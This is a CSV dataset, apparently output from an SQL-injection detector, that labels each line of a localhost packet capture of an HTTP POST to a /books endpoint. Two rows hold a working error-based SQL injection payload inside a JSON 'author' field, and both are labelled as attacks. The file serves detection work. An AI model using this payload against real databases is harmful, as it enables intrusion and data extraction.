,raw_sql,predict_val
0,"19:06:17.610537 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.44410 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0x8084), seq 3616636643, win 43690, options [mss 65476,sackOK,TS val 8191682 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
1,"19:06:17.610559 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.44410: Flags [S.], cksum 0x0030 (incorrect -> 0x533b), seq 993718974, ack 3616636644, win 43690, options [mss 65476,sackOK,TS val 8191682 ecr 8191682,nop,wscale 7], length 0",VALID-REQUEST
2,"19:06:17.610573 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.44410 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x256d), seq 1, ack 1, win 342, options [nop,nop,TS val 8191682 ecr 8191682], length 0",VALID-REQUEST
3,"19:06:17.610661 IP6 (hlim 64, next-header TCP (6) payload length: 428) ::1.44410 > ::1.8080: Flags [P.], cksum 0x01b4 (incorrect -> 0x43eb), seq 1:397, ack 1, win 342, options [nop,nop,TS val 8191682 ecr 8191682], length 396: HTTP, length: 396",VALID-REQUEST
4,POST /books HTTP/1.1,VALID-REQUEST
5,User-Agent: curl/7.29.0,VALID-REQUEST
6,Host: localhost:8080,VALID-REQUEST
7,Accept: */*,VALID-REQUEST
8,Content-type:application/json,VALID-REQUEST
9,Content-Length: 260,VALID-REQUEST
10,"{""name"":""Hackathon-Demo0"",""author"":""RameshAND ROW(4115,7844)>(SELECT COUNT(*),CONCAT(0x717a786271,(SELECT (ELT(4115=4115,1))),0x7176767871,FLOOR(RAND(0)*2))x FROM (SELECT 9757 UNION SELECT 8982 UNION SELECT 5308 UNION SELECT 5233)a GROUP BY x)"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
11,"19:06:17.610674 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.44410: Flags [.], cksum 0x0028 (incorrect -> 0x23d9), seq 1, ack 397, win 350, options [nop,nop,TS val 8191682 ecr 8191682], length 0",VALID-REQUEST
12,"19:06:17.616979 IP6 (hlim 64, next-header TCP (6) payload length: 434) ::1.8080 > ::1.44410: Flags [P.], cksum 0x01ba (incorrect -> 0xd150), seq 1:403, ack 397, win 350, options [nop,nop,TS val 8191689 ecr 8191682], length 402: HTTP, length: 402",VALID-REQUEST
13,HTTP/1.1 201,VALID-REQUEST
14,Content-Type: application/json;charset=UTF-8,VALID-REQUEST
15,Transfer-Encoding: chunked,VALID-REQUEST
16,"Date: Thu, 27 Jun 2019 19:06:17 GMT",VALID-REQUEST
17,10b,VALID-REQUEST
18,"{""id"":128,""name"":""Hackathon-Demo0"",""author"":""RameshAND ROW(4115,7844)>(SELECT COUNT(*),CONCAT(0x717a786271,(SELECT (ELT(4115=4115,1))),0x7176767871,FLOOR(RAND(0)*2))x FROM (SELECT 9757 UNION SELECT 8982 UNION SELECT 5308 UNION SELECT 5233)a GROUP BY x)"",""price"":9.99}",SQL-INJECTION ATTACK
19,"19:06:17.616997 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.44410 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x2239), seq 397, ack 403, win 350, options [nop,nop,TS val 8191689 ecr 8191689], length 0",VALID-REQUEST
